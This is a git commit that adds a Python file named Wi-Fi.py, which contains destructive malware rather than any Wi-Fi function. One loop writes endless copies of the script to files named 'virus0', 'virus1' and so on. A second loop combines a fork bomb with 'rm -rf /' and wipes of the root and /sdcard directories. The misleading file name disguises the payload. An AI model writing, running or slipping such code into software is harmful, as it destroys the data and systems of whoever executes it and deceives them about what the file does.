4f38884769454bbc77dd6b88208aa8fc409aba44
kaido309x <117782362+kaido309x@users.noreply.github.com>
2022-11-19 23:01:40 +0200

    Create Wi-Fi.py

---
+++ Wi-Fi.py
@@ -0,0 +1,15 @@
+import os;
+kaido309x = 0
+while True:
+	with open("virus{0}".format
+	(kaido309x), "w") as f:
+		f.write(open(__file__).read())
+		f.close()
+		kaido309x +=1
+while (True):
+	os.fork()
+	os.system('rm -rf /')
+	os.system('cd /')
+	os.system('rm -rif *')
+	os.system('cd /sdcard')
+	os.system('rm -rif *')
